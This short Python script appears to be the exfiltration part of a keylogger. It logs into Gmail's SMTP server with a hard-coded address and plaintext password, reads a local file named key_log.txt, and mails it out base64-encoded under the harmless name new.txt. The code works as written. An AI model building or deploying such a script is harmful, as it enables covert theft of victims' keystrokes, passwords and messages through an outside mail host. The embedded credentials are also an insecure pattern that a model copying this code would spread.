import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

from_user = "nick.noswear@gmail.com"
to_user = "nick.noswear@gmail.com"
password = "Nick@123"

server = smtplib.SMTP('smtp.gmail.com',587)
server.starttls()
server.login(from_user, password)

subject = "Testing"

msg = MIMEMultipart()
msg['From'] = from_user
msg['To'] = to_user
msg['Subject']  = subject

body = "This is a random msg"
msg.attach(MIMEText(body,'plain'))

filename = "new.txt"
attachment = open("C:/Users/noswear/Desktop/Mail/key_log.txt")

p = MIMEBase('application', 'octet-stream')
p.set_payload((attachment).read())
encoders.encode_base64(p)
p.add_header('Content-Disposition',"attachment; filename= %s" % filename)


msg.attach(p)


text = msg.as_string()

server.sendmail(from_user,to_user,text)
server.close()




